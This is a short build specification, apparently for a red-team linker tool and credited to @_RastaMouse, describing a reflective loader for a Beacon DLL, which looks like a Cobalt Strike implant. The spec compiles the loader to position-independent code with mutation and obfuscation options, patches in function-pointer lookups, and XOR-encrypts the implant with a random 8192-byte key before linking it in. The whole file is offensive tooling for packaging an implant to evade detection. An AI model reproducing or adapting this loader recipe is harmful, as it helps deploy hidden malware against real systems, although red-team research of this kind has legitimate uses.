name     "Beacon Patch Loader"
describe "A reflective loader that receives key function pointers"
author   "Daniel Duggan (@_RastaMouse)"

x64:
	load "bin/loader.x64.o"
		make pic +optimize +disco +mutate

		patch "pGetModuleHandle" $GMH
		patch "pGetProcAddress"  $GPA

		generate $KEY 8192

		push $DLL
			xor $KEY
			preplen
			link "beacon_dll"

		push $KEY
			preplen
			link "xor_key"
	
	export
